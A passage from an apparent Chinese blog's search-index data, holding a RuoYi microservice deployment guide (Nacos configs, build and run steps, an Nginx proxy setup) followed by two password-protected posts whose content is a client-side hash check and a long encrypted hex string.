server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9202# Springspring:   application:    # 应用名称    name: ruoyi-gen  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9203# Springspring:   application:    # 应用名称    name: ruoyi-job  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9201# Springspring:   application:    # 应用名称    name: ruoyi-system  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9100# Springspring:   application:    # 应用名称    name: ruoyi-monitor  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n运行\n打开 ruoyi-master 下的bin目录,先执行clean.bat清理,再执行package.bat打包。\n打包完成后执行run-xxx.bat\nrun-gateway.bat,run-auth.bat,run-modules-system.bat这三个必须运行，其余可选。\n前端运行\n配置\n打开vue.config.js，将下图位置配置为网关的端口和ip\n\n运行\n先在命令行执行npm install\n再执行npm run dev即可运行\n\n生产环境部署\n在开发环境的基础上打包前后端代码即可对生产环境部署\n前端部署\n在ruoyi-ui目录下执行npm run build:prod命令即可打包，打包完成后会生成dist目录，这个目录就是打包好的文件。\n\n\n打开小皮面板将nginx启动并添加网站目录。\n\n\n配置 Nginx 使前端的请求可以正确的转发到后端\n\nserver &#123;    listen       80;    server_name  localhost;    location / &#123;        # 设置为部署目录        root   &quot;D:/website/localhost_80&quot;;        try_files $uri $uri/ /index.html;        index  index.html index.htm;    &#125;    location /prod-api/&#123;        proxy_set_header Host $http_host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header REMOTE-HOST $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_pass http://localhost:8080/;    &#125;    # 避免actuator暴露    if ($uri ~ &quot;/actuator&quot;) &#123;        return 403;    &#125;    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   html;    &#125;&#125;\n最后重启Nginx没有抛出错误即完成前端部署\n\n后端部署\n部署前先运行起来 nacos,seata,mysql,redis，在开发环境中有写。\n打开 ruoyi-master/bin 目录，执行 clean.bat,再执行package.bat进行打包\n打包完成之后，根据下图把jar包复制出来用命令运行即可。\n\n\n此处可扩展业务代码，每个模块下都有jar包。打包后都在每个模块下的target目录下。\n\n最后还有下载的jars下的 sentinel-dashboard-1.8.8.jar 也要放到一起。\n\n最后使用以下命令来运行所有jar包。\njava -jar xxx.jar# sentinel需要用以下命令运行java -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar\n","tags":["nacos","RuoYi","若依管理系统","微服务"]},{"title":"Linux 系统部署与维护练习题","url":"/posts/8f70eb62/","content":"\n          \n              #best-form {\n                  width: 80%;\n                  text-align: center;\n                  margin: auto;\n              }\n              #best-form .inp {\n                  width: 100%;\n                  padding: 1em 0.5em;\n                  margin: 0 0 1em 0;\n                  border: 0;\n                  outline: none;\n                  border-bottom: 2px solid #ccc;\n                  transition: ease .5s;\n              }\n              #best-form .inp:focus {\n                  border: 0;\n                  border-bottom: 2px solid orange;\n              }\n              #best-form input[type='submit'] {\n                  font-size: 1.5em;\n                  background: orange;\n                  padding: 0.2em 0.5em;\n                  color: white;\n                  border-radius: 1em;\n                  cursor: pointer;\n                  border: 0;\n              }\n          \n          \n              刷新页面即可恢复加密\n              \n              \n              \n              \n          \n          \n              const sha256 = (text) => CryptoJS.SHA256(text).toString(CryptoJS.enc.Hex);\n              document.querySelector('#best-form').addEventListener('submit', async function (e) {\n                e.preventDefault();\n                const name = this['best-name'].value;\n                const username = this['best-username'].value;\n                const password = this['best-password'].value;\n                const users = [{\"result\":\"\",\"name\":\"785ca6708470f42b52906f604aed157bcc7f941008981311f0aa68bdef3567ae\",\"account\":\"7c5d7795860f6d3efec596f1f4ec5980d8e5ce47d5f68fa47d43fc0858284022\",\"salt\":\"9304baab75a065a083c07b6ad2354fa8\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\",\"4aad6938451b398c8544546bb8dc9e17f8926d9d92ce3c400d552ffb05a9659b\"]},{\"result\":\"\",\"name\":\"5dca4de7c25ef54fe2d0e3389b7e28e63b715e2911125343e110d31623aee81a\",\"account\":\"cef472f90aeb4b39bcf8dcb875eca6a1c49a77835e697462711199985613ea69\",\"salt\":\"9304baab75a065a083c07b6ad2354fa8\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\"]}];\n                if(name.trim() === '' || username.trim() === '' || password.trim() === '') {\n                  alert(\"请输入信息\");\n                  return;\n                };\n                const id = '8f70eb62';\n                let login = false;\n                let index = -1;\n                for(let i = 0;i","tags":["Linux","RHEL8","练习"]},{"title":"路由交换技术考试","url":"/posts/ef817dbb/","content":"\n          \n              #best-form {\n                  width: 80%;\n                  text-align: center;\n                  margin: auto;\n              }\n              #best-form .inp {\n                  width: 100%;\n                  padding: 1em 0.5em;\n                  margin: 0 0 1em 0;\n                  border: 0;\n                  outline: none;\n                  border-bottom: 2px solid #ccc;\n                  transition: ease .5s;\n              }\n              #best-form .inp:focus {\n                  border: 0;\n                  border-bottom: 2px solid orange;\n              }\n              #best-form input[type='submit'] {\n                  font-size: 1.5em;\n                  background: orange;\n                  padding: 0.2em 0.5em;\n                  color: white;\n                  border-radius: 1em;\n                  cursor: pointer;\n                  border: 0;\n              }\n          \n          \n              刷新页面即可恢复加密\n              \n              \n              \n              \n          \n          \n              const sha256 = (text) => CryptoJS.SHA256(text).toString(CryptoJS.enc.Hex);\n              document.querySelector('#best-form').addEventListener('submit', async function (e) {\n                e.preventDefault();\n                const name = this['best-name'].value;\n                const username = this['best-username'].value;\n                const password = this['best-password'].value;\n                const users = [{\"result\":\"53b841717766ccd3037df4bcdb4ea84b03f98703f384fdce262798cad065ca7429cfba3b279cb2c8bc78416450fabb7be6d3944846dedef4fc8598e8a39173efe6923bee506e99b0905e7299b15e79c989ed97ac7118c0d2847c35e4520f7316db0db0e8c6bd3dace2a8d24882320a7f1015471124bffde96b375c2d5989bda41ce432643930c3c15021aa9237d1f6e3faf91259a68c8be9df42831e9adc9cf07da5ba11817e96d2f99a37958752fb8edd5580a03d0da48d669eb8ae1e84f4d9b098555cebea62354d6629b8abad34ff74997670e485440921a20b68a5a6fe16645848a412cc4fca9b462619d40f4e3c763363b1c8a2ccbf4cceaf9fcec1c66896701ed5aa385cfb05ca21fe5a8cf77279a33e8c2bc3443936b47189e0697f53d4046b070411e14b2f3eb8ddf8232c70fcb3532014dd09087f696939f4ec9520c7de6f93be0a7990eef20664cab8212c806005cf830e09f0d6a8d6a381b8c8370328770bc4b19948e1c542e3cff871f1f23c5803fdf412526534f0c63d231229dd0e9a4e4fb4e912ad2b0ae4207477a50eb4d74768717d8194ff5c66b246ca4cb501245ddbdb8d21f5de0d223928aabd6223fa85c6dba4aa4a0d81c865635484e06585e80a941dffc19a986da3046ba2eadf673785de3b7602680f08124cbe0cc3515f34c2bee826c114bc92c31feb4a3f24301afc59ad8422fad4d8b35221dc6177efb3c8ce2eef99f7c6933e28634f18a52646241697b66ba640e4e476bf5fc69c0ea617a365dce885f1bf462f8a307c38307fe8737799f6e95fc26d3ebc76322493ed3afc94a3cd12efe2a8bcff30555217cbf6296332bda03d81d7a8d5ef26b8bd01c195fc5fb925dc33f088d65d80b2c9d213e57d19598bbb80e0a78dca73991c91e01adbe53595ecfd5447ba413662d9fdc316914be89f1ac91289f3340b12258102412d2c97258c2013bcd1110f5d04258042e6d47d2d97b8a8ad655cb38e0c9df2a51ccd1fb7e13200aea08181191e631aedf019d4b7abe07043943449b1a911c4c31119a2178b25a9ca92b33f1d55640c9b7ddc85f650e74f8ad216e366df69b755af7af5ce67be0f497c3ba6a9b507113666a74d1b76c3a78ffc004060d3b0a89480c064e81d44fffdab9d362e1421f7e28d6f2893810754ea24e992026caf1932627d047ff24d004028474d114d25ec640d7a1b64fbb9586992d7f32c6970fa083588c4c722c1d75b4950794c8f55f88d9483b2c80a11aa739aed77aa3e7f76d552fb39518acc8ebc30b64fd26c48536473b24afa925a5bf108ed0af00e2cb074f10ea39afe5ed8343595f5c065c735af38ed5bd5192aa5adc936c17c82761197406ba8d50fc7672179b8c24759e130439dc61cb596862056bfdac58bfab9049e8676c9523de295c76a5d5ad80cae2d034e4fbda6249ad0a39e6c07641ecec25f8a124836a1a74db1409a148e333b8536f61f1c69cd6c771f9b1c04659d776fb6c05162c6ef6868c618905e2a9ed46ba5add559de6a4018caed6dde109220bec5fb1dd773f05b84049dcaeb875ddfe7f273993c351bacd4c613907b9891cad4ecc9614a1329b4d5961333db6f8ee12d70ae67edefc4d8826f533b9c3776b9529322bdcd093ab78a7ee378d11d3dfaf47304fd5db6d0163bafe3e782b81eea1ceb50c25df5bb1a1c7bb203ea1da6c0c8ee9bc489ead721941a9e3961380b890fd032700b6f6e515ee4c0e61eac9fe41b00fcc4ef72ad6a4cc097818fe6349f052ada5ed452317fe6341765cd49e7ea94f0874cc15d66f86f5b07b591164fbbe7aa4a5c8756ee6923646182d9064101b110b2ec80ab50d6e1834f1bae16bc66048872c3d983e5348121c0f6a758aa97bade45eab074be43dcc49960bbe5892ddb1162b78d0e458658675d9836690d96369aa2a7e0a685139d674a53f331f79a41da9d817f022cc811187f779200d8ac53e2c78241e3e29d337556a07938c1a97d1ea933ff499b70b3816d6325e0165952a09ad48b101733ecacc95fc2b4f3a3d7b9fe7248720d0095b24a5e7c2c4f21278b4c23298f91e2ae3ea25b77d4b8d78e9de3a9728000eb29ed7d1908a1bfea42c5e952ec99deb75d389bfccaa767c6d9958e86661797f3ad7dbe20501a1302a2eb4c331c6322be59147fc87be201ab3342ee10a479eb0513d9c820c7a4d9ad2a890956d09b3771dbdd0bec4964cd402cea27dfaa9bfc54b30daf6c50d3c06b6fa81a3756cbfe877301c8ec2b0ae7a080addcec7165abd722d02ab5bce8acf04b45d17e6f8feba5bdca3055ecb99dce3b236afb4b6ad29bc2da1f7fb456c0a9ae4b460231a1817e2a365c966aa0200c4a34bdf2e5d35d794b40fcbb608a3728fb468905310092a3cb3c8f07f58de72ebd7e6e0288709463a2f3f09bef8b79ad05b236dbddac23a949ab910384073145f120068d888037221e2651baebbb9dd21db13c46eae2b9548be2cdf63ca03c643fbd639dd69d221fa7c64f665ed225a54c9960dd9b51c7a6630ca3dfaaa61ba7a10cce3c27417b91dc5f8749104146c70b50c851792d5289dc5bde83c65366965297349105399e63cb18fed06f9a03b50143ba4c2dab3c0039bfc09a7c426bb0c1f0e52d16fdf120f462872ca9fd75116df6c7cde4e9463fc9ca6f612795b70edb24960108eab4178e2dcd1017198debf3e03031fb5bb7d9e2082cecd2cfdea62ee3a265d6eb00181ee0c3d9aa7b9801466ac3f2707b466e5a090d65c9056912a2f56cb75b7635398a01cac98b9f8ac2e2fd1dd3a79e49e40caa21bdf19e0c26fb410725937c2dbfc1e4391bdd478ceb75467975e329abaf6aa9e0d5ee18e945075656a7ff6a2aa01ab7d1cf9f9c3e93394fe8f03d971896e2ec625888febbae6c90e312a60037c46cf0ad332c6fa237acdab1aeeebe91406bcd3b2a27c7be6010fff65caec3e068a93eb85f675c2c77d82c03902a9f8100fd0a208730fa26b863d08a0ae859739115b2b8e2361dab3c342533c49956a612e57991117164ab107093c13f948db1c11887d4086c999cf7db15ae303bd2aa878ac92981e512b9d33693ec65e194b28f8fc5e3894286b54f988e0392b89a381de4ff17157ba9be687133c841289da9759efc5a7fb3557ed445508295192149873f167c0b3258b27d85d0398dd1856f4b9d933d81c6ded40cae107295614260388da5360be1dab27c87fbb83b505b5c2489a6eaa1271ab7184982be34ab61346c696f24b1de005197ec86990bfacb493927b063183e948c6969cd3aa49d4e52c54780be737bb62a3e1fa0b08b7069e23640e8bbf6ea5f25897dc5f0bbf23b51a6f5052c34e845d5ca5dfde0efce8ed629558642accb1116052fa01efe78234c4a3b63030e92209d339b69d892b426aca453ad72bfea13fbd3f3886e70945676d2b9460a947cedb92751c0fb453b5909cda1efc5c6615f951bf252ed1c5575aa254348de94c2029d5e36dfb515b2a41a313f4da76ff8e223a91325327bc70a7c4fb4dd23a446172a07694494361ff5280aba947cb58135382f118597db3352393d4806fda173ca942fea56d22cd177fa2239df5d3907abf0f50de3a0cc0fec7bc991e40acbfeff371a8ec30e2465da22b58601932f01c8b21f49493745bd745dea22ffdede2fd98e2caf6b4a7b1d48fea260f3782501cd2d1acc86626d9a6c6db2f698ff7584482d93cc89e455a08edb436f661dd2cd595b750d80ef38d14c15933f6661a5995f8ec513e15afa7163473d2b2f6aa37a3eaa16781c05aedc0d72a7901da212cc9ed1637fad8137b7cfb690d9a6d2a20a5e4bb2a6d124229060bf92f096bcda3241dc47301a9cfacb2ab1a50f5eca7c2d4e0bd505cf28c2af4be4db32d08cff7f6938a7b84952bf123210a9063f594b05938d2ddb113a14d1ddfecf33b972326a07f9f4f4babcd85ec1366c2aad2180615800d6a4e3b06d02c2d1d6556c589db78f9c53e05fbaab7575a9489049e28cd2fbcea6ffd063c7723d6a204eb81e6fc41b3c19c1c9a4f47d39e3e003a5faa2321f8278ab60f2bae5e72bf4fa00fee01c0c9b1d7c7c6450194b3525a26d148d94d0000d38582c8d8daa86dfe0eb713f495f61d5298802c66575cd3a1206b0861989e056d5afa0cbbb5e687cdd832e4f9ba0262544ff0db9b791e88b1a6e71f5f756b363c3d1824ea92714c70b7f404681ea6c321dfb3faeb2a3360b2a396027d974c74988ef939eaa801f1c3ac4b1b73a7c84531e0bc314988f45012d5d559278539b127caf35963bc597ae98d1df0fd3c2a8b9ae7bc69ab856ea0611d9857acf626a6b1744226b0d6098f0da51c763466a97765e796fc337e0185e4921ba8004ee39dad2aca426e719a9c7a86262aadae15c4efc373e2c1d4179b53f1f1a923dbc5dc81fb846927d69acb42789dc5df3c95e28a56a341cb9ded1551369b954bde6832a3e2fcba19895da7eaacc2817a50a7416e46f66711f11d58acf6a39c6fed5aa8be2682da2093c1bdb912b27391b75b6e9cd04e067d412775888931add63a6bb306c49995af57bc0e73e0f74282226a183c1864555bc5fb868a4cfd4eab14006105168f167e93c3cee1501caa4e175b73914f372017c8d9c8d8f4b17c95cc49a31fcaa404c7cb7c47f68c909261404f6b93154cea5e7719541c32c2285d79a8f47c1f1bf28765b05b660fc498db3c624feac1366a335ce02f3a67f903bb026a0d8129e663126cb47bf1056a66fd8ef2f8032829ebce6aca966655fe8ba53d3b1fb0bc22dcb8657cd474a3f09b843f1b37018b9da6ae098a4a148779597d8c77a1fa51e2c45a38d572d5fee6a3f591eea6de2b35c45c2769af76e18cebd9112c008a48b92f2109efb555af4f741e5049c1ead82cd937174c69125d3ce72cc4473bfbb180bf671f7210b51f8177a6b3ee4db3fee25119d17757a19a33852e2a44e066ffd8f050b07532692880ee375fc72cfcaa12b5794885f8b4518bb4a853ef63bef740491156aabc8910ef1a164e98c4d809967717c8075418b06400e6bc88875cfe2fb93fa04c6c875a8081dc25dcd63fc4e87549e0bed7dba84f8e5e50b27e751784b06791265d8cb4e9eda345c1f4b0a5a0b0656f4beefcf3589c3b918c04b7bd46c468cbb85131fb3cbb4477c14cfe8299ca49a5a8bb294a53f13b46290c9517e3e2c5ffd7f9cf0fb1cbbfb9d01c2cb600be858656f27662b9a55021ebbc276fd7360c49b8c69493ded6d1544de9baa986150aa27027515570d2831bb2720eb11d32d58275fcaae9ae810a80c955f5e76e1537ecde4b68d5029b28ce7c3d5b9dd630d5f666a7d76ebce697aa6e1f8609e3986a25bff7ecdf1eb1127986e82af46133a3a71ac0fa50f93610681ebc5195e6ad5efa610c9e9a509a7ac48d40151f1847a93f3f13812ca2ae4cf15d77459d0111ffd88f668ee9283ab5555ad2902abe094c06dad0ec422123a991510e810de1092c8fba51bcca232dd2a7f825a47974997000ef5146e34b98fb4354e8c49e99ef6be67b4caf3268ab436b8f3ac8a21d4094945931d6b23c974b9ec3c7b0cf208a06e80398c48719db3bff81e6d3dd3fa77774b9d52ad44e2cd9874df9b916be07bd9e5aa78e3392a868a6793421dd5290cdf82b27cc11cf37585df1090d79bf89a676c07e81bf9df9f36964d4fa8e38076f119975e4df1fdb68ecee6b3255088b575234f4850a776015e0dcfb33cb5ebfdc1d3073134ce242d352776cbbe2e4f856e551c113c84dea8679bd7be7deeba500a350da8bcfe2195b43d4ccbea8e144bcdc66e13432cc7c3e69092a7c58a5eecb3985f5b8ede7531baf832e3aa14a11f569efcf653b9a89ee345ea0733d8cec59b15803492a50f31dc5227af9c371a67ca1621cfdc669e09dc18633a5b98b88a7f520c6384bd12ea860f15b6b8435bf6c7d0a00dca592356dccf9a52bb31857c2d9f988467f66288e0ff7ca28b56a94285b302620120bf32803e83fc55a90dff35f85626a591870d4140c235ee99d44bed6d7330676ca992984474195d117c47fe7acedb50fc9c1551fcff92d008aced0911d3468447e4acdc31858b6b6c86570d14ec2449f869ca06925e6ab167ffc8c58a0654e5a79b5b6d74cf088d147ee2e565a417952abb3687f3405f425bce3bd783218fc124a5e00761b916e67effff664b8c85b4ce05be7a192065ecb11a96306b3f7f7a3bf8377854efb5a00e3c5d1403cb7de0ae41b2d8b2f9b105592766c71c572fba1e0e3c63a5e50dc38130ff5080a07033a1799dd231dc7ab4a5c34b30eab424a4e514cdf41e5d8936df05a7d1bea3be931328f0b2514a1b75b70352dee863a010287fb90d9cc7a12882f2fe404e6f43b0a2e049bfdc6779e03345efbdb35e3cc212bedf9b080017af81d55143bd11980e515444aa3b28f0342bf28c2e550cf927cf17102101af67b0573e59671e1944274bb8547b0bd431436642429381c99dc8f8d8e3440f75dbe643d28110798c429fb801d0c37d69883766fad877f6de9fb56909e8c77a8569b85c28fb1a973675431d46473cf2b5f859ae42ed0696c2eb8f298045ccfa2319794da1c0258096ae092b650ec87110943f4807a5561901c8f460a79c8568df9fc01b0afbad9d6f085565b19499bb6926784edb3093b360259e16b4df15389d1f6b2086b8dc7633f2b7d030bbb05a5d20299fb6a64c8fcd89bd2bd1176d6e57ab639b194484b71e6608871572ddcc59a84fd1381cf002d572ccbd48eaa1c04458da2784db51dfa1973f9ec78f5d10a146b6fcd8ce73a669dd773b5fe584a6890f1f20910f1f7ffe3efc8f946a39cec144d0bbc031cda22db9ee6e99a52e5dff0766348385ba125e761f31933af85a0c208a65071ab6fc65bd3072f2427ce64150540171c3adc2623a04ed7a0eca8e45ca9ae8ae1da44faff58193fda8521fe4f4fb54ffdce332b9dbd5a6224a732ff04c3ca712afe3dfcce4938e9510a3d1c8695a6413ee53c2f24c1d2ed9cd09aca4cf136289012104c50bb40dca86a28d68017636c248456262b5bfc00be414b9b20f09190837143eb2ce1494c9e66241424e646da48c58c9a078fcbb5102c1494cf32acfcc35d45ccd6cc6bee6c79ca6fd0a32256b4c1fea13dc949b88bd6687268ffdd38e693b7a559b50e40db6a27daa1fd3ca1580aa10fe2884c0b9aa38f83706034ada53dcf8d2d21daba8e1c96e6dcf2867b5f8b2a5894039bf42e86948cb0155c61ffe590c86575361cfcf8c3543095c38d1ab667afc5805bcf3e462f76316f248815579bef1e407024d92849c389b1bdf9b3a855880308071fe70ad62210ab2d3ae80f3487633ee5f678a3015369718a6508a7c1c02b2c08f694383c148b86a169eee94387fdcfb8edaf8976c66b55872d8e668f01ec0ffdd432a9189b3a3d8f5f5d10dfc34ced936867fecde0d50cefa61b7ad4d041fd200270f7ffbcafe0e1017099b90bdbf3b237b2ecbf07d82b05ded05459c9495cebf9f71912bedab80a9e52b83fc2ad8310de73eecc4a31dcbfb944ce33b4fac3805e1a6dc614d554e5e69c7b0693ee8115a1271f6bbd0857ac7bc539d37e17046f84c2542e284ccae5a7a197d5143a15eeb9f1f72eeb067019452d6a8b234441b6768714d5f409ae80c2963badc3d878b590a0d200350740fc8daaf64ba9435cbdebb5dc9086b2f388505d4a02466f1c59eccaa5424578704e4590c096afd17efa76380d49b9d6a43e9c516e417fbf3f2ada3ea1fe4b1f79963675c0658309e1e18bb28fcc94efe1bd09436e5433db00ed3bd373a862555fbc77eb992c584443e362e046aa5d514ad39af70634f880f06832f70d477881222c4629eb4e6d513c8454c94792a7c902e4190bcc2377f20f33f3b34f11a1c4a94c9faca7bc45183693b9a0ae50edf960e24c8e3180bebf62d8e7df442c39683f967452c53cb98680bd415ed61082a2e465fe53970611380fbf4da7d8a583a49d6821166533c9a1fac20e67d843c744c498299d2195690b46884c22464ab9e1010e5110147dbe1aba03405dd1c7bd191640c3bd6481145565d8756f3c58c581a3413ba2575371abe73415b3eb384d799a2fcddf19768fd5b49a01337af10b8f45c4ab3cc03c7789d1e8f9188cc06e91091ed51340b04eb5f8d407485ed1e67e46500e5c315b42166a0ead7030172921dc55c15039acb39c7eab425971961937643c859ab48537029813c1fa6597f5636db292f95b20db6ef37dea14e88aa6075834eef52db303b9cae781ae7b323b563cdc87a4825ec8819a4ca9116c70b212245c54fdc56ee70e6155fba2bdb0297cf5c12cfc85e1dde0c249d8a7fa1f1935eb4ecd3ca8652e30b0146b761663af7584821d7a270ded1271b650883b44d7e6f4f3a02d58544a262736dae6cdd5dcf7b6824dfee15f4cf3955f7c8eee3f096ef664f27ccfa88ccd6f171b3806661819368a4d3b646c08673d91e8f577d3c1202faed328e9762d92b304df00c75d65c9c87d144e6075080d612785ab01f5af16113307c9216420c318f44bb8cfd72bbcd440d4bdd5be4075a8fbb75ddf8e979a275714e0fd229512cea80daa34f3fa21fd6073dd1aa8f71ffee5027a112b925cf0f535048cefece6bf5843cb9c8d8e51adec2c9a8ef16ee62b9a17b957f69e06a5dbc00ca7984949c303cfe2591bb7bfeb4362af9c943b141b794a23742e7b1162f0dcc9b803f0073199879843765d7bd77b1c7d6f55bac1544eb5acf688a2503fe7b3562b1b625ba30b7f8babb35f85b77e622b97fc555676e200d43d7d9ec029b0231ec01c9f35d958d475d264ae3c80df315d09dee7ae4095b8412519a55186567232492c551aab16966e7e2c326531748de4a3dd0ba7272b8b84f9ad7dee58b405667c164b257cfd78ac2847ef838725288176e16d9707dd9b289bbc79236c316515c6c3a0ade3aeb7d7355a0ada04e0e7a292f6dd1beb3a9d400e103445603ac7333060815cd56bcd43baf73c0df268c766b85b92b2749436e2fa89c6039b43273b0eb19dad644c970a592f0da7482a449fce535819c7de2742d08160f271dfc03c331cf9a5eaf0db9bf267b8d53afca5014c0a5056536512f5833f49d2efbc64a5ab36c9d053a703f6eadcd832b82aa6409cd6f0bdc7e524df7d3aba8a89c899d88be0ebae5beaa4ffd0874c946e184cffd9803d1c97e8723e469c3a4b0329141d545d2c4d8674d71a43b2c3d70d2195a50facd9f747b08a1ad4f072273f8ddbf9e869345ed08a5690a69f3f98b4237aea0e82746d0a4ad652f68245102d52ed3bb0bd89a0464ec19500b615455ba0539625e9445249ea08449744cb172b5526de8b825728f185a35b1c292b93f5fb234ad6222292879dd37b2bb7338898476faf649e5aeddc42930a4f96731c85857fac866b70afbafdab8f8d66fa2c9dba5323ffa5f79e0e31604da48426621c62444e1dc450586f69f4a6f28fc890a0abfce1266e690d5ce9c2d1e08f9cc66ff018cd9343e0175a89aceacff2c2836ad60bd9d3cb5f5cf1e7016b9dd106ee22b698f2c2d8a6382594e01c2383a5cc75f9b4e72bca5c17883ddf8e467cf2e729ac7ed6003f93e844b8a52a792a00cfac85abc2285d5bbd43ca7816bcb0d8f6ffc0f97b5159bf073ac1dbe8ac5d528098111ecbf120da44a5a945b0beb6fa4c931b735eb82fdd476ad995f52423cbfb58f9c852c5a096a7d281c09ac8ef2fb2aa0126b294349146c44eb862965e7f69e929ca57ec5112097eb8c86720c005872cc257a7ea30297c7a7602bae74b9027a6659f17344c56f95e11a7cd6ec3c831ca9f15f125dee7efcd4073acb8acea1fb44b18aa63c39b714c7f9a34fd8a2c1ed11f4be56d6bcf27a7c52b1564381d983f4849c3fa763b9d6aeb37212f6bcc43d92a742978814240283fa3f905c0c31f7a0c4b69b960e605ae6133a0572db0658bed8669eebc390f80b7f7f556beb6107464493abb2a21cd80d25d8dfa17347ed7b420f44bc9ad16b4e09c895f838d753cf260e47a1d57d77b8391e2a5b02ec8071c2ff35a161d969c8c16af014490800693f8033d5484170f0dd501f6e306b24fe212a88da29889b03cdc5d6d659e485bf547f13c8b2e6922a8b87a450366aa81f0246eebf5881f4b0a8b0cee861eaff5672c65923ed5e5330312c7cf9a2528d5d042e5e1f72f98e1dc88a0c4f6552cdefb7f1ae30ff519866fe2b03559e446510422bf18e5e38603d9d2af63213bc33fa396f89fb57535874760c662c1baaec3f67c0d9549d2dac1fb52c8b58342b6928f4a82bf30e20ba9d6cdce76f2c991cb75e1f51605641a9f76e241b410b0b0e36a7dcc37cc6e41a61645c0f739e9b0242a9c6c71e8758990f28b3ffaeff24aa956142df462fd08f496355ab405068c3a9583daa6bc57223966e1c265650905efdb5f22ebe2dbd9bfd56bd500c44a1b312a66b79cb11e135b240717c38ade280767261aafc5cea173ad30f26c406970c80d182ad729d32b9ae9cbe3608cfda0b483dcc905d8bc4c9cfb55842c412c9cd0176b7d33a9ba7a1a55d676e858d2eace8f1facf09a2bcd923894f7e932311647c679423ec7b66d07559aaf613361907ead454dfb576e0b3dc036e5bc35fb358d783195ca0bd9333ff570e00dce9c037d180dabfc34281e1ae23caee8db8f40bfd6933570b777843b18d1ac9c65ebc73c71d952ef776dfab0ed3d64a5fac3b2da55007066de4b728fed423e5b2683f3797c2331a8ea6a4afdc26da2edae8fbee4f20ed8f7e58047dc6fe98b61cd6799cadba6a3e187aa7731773302d712922d3b9dfc043cd7d11a76f5cb39554e622e06368775546dfddad541f4bdabc27210181779eaf8c0698d0479ef218de1a0062a69fd1add8bdd58ae8a9b22577704dae1b25244dc1e8aa6278237e7897d054e0ef46db128870c1e7c075ad9e9f35916a75c2600a9c64323d2187421fb714975da7e9a82f179c56d224bc46c9a4b11bc2e7e2b9863c5b55013b9ba65458c0fd725f5ee9ea3fa208fadc60e54c7907d243cde090522d70dac1c85607323efebe8dfdfa0eebca49a93516229cbbf75b49fc47e70953c5685898080b6e3453ed46311ffa11a3b6e877182f6ad5f851264f9150b6d18c869d20afd6b55a1a5fc43ddfba9ae7f99e52ff1265a3ed0ca7ed1b48371497a717fc45b809324c18606ba5591447485ce4e51a7e40450231f6cfa723663ae2abeedd2f67c4a6682e6710d7baa6dc8bdeebcae86c54da6e783671961508bea392968e54463d8e315a1b5d8d463797dd92839a9fc6e199fe1a37a0f3e1c1396f3769694f81e23a1981e6b2e6d9cff5238bf0e1fdb1b94df52bdcf5d99a660f17e064a50ba2d6ed3ebcbcb275d1b3d5c5f56f9995bebc363df248d3d13ebb63e304c7f4ba140496a6ddcb9cc27118d14a831cefc73956ce077d6d32eb94d50e8e92f8c7a41e4e5973b7aef5277bd2143dd8541af1e1baf31e741c727268b921170316b146f3c702d202d5348a2111afe9a3531aca09dcefb9e2d4fcd0caae3bf9df7379134df4357ed7df6ccfe00a30cde246553e7b7715d62f1159fc796c8ccb08e90b59b5ba54ee76a2984b62a4bb6f324b44d44e97ce57c24c1eb1376510f60d2819a3acd236cd322b6bbe5724702b511936143d911794d913dd30ced53fa2c5f911167cff95d176ff85e5376984bab774b0098749046d24f36d8270ec3fd7cfbf2893892ade1b0aed5548e236f89eaf9cc7d577ab5bbbd89ace728d8497ebe8e2f5162c62019dd306165980dd92376c66e843539631667d9edddcc4a5836c9f5ca2a2d150500d0d75cefbfb4ece19ec7a031f5b6f74069ec95a715e93175851cd330b3e7328a15d2a7cf37a2aab3c14f453850eb5076136900cde3e1f22a8f8400445c97b6846e2d7581bdbcbc75a9f81294c4d731c20836d53ffa94f99c1f493783e9df1ce2e7b30cdff946faae2f76a04a4e8239f73c981b30d040021cf5e2d8e57589772ebe26ae0d4adafa38b4393b220d016134e475cae67a5ce79e34e82eeb8c8792444f5b9d8fef75a987bd692c987027a850c8dd91c015bb857b486790621c02feca611e36acbdd3b16ccef0453a946af2c6c5aa38284d1ce353d62b4a94953c69ed38a89dcae2a7e2448b121f225154a785ea32d3b4f3b099b282b5d089194a73a3b79e1178802ef80a041ab2c08f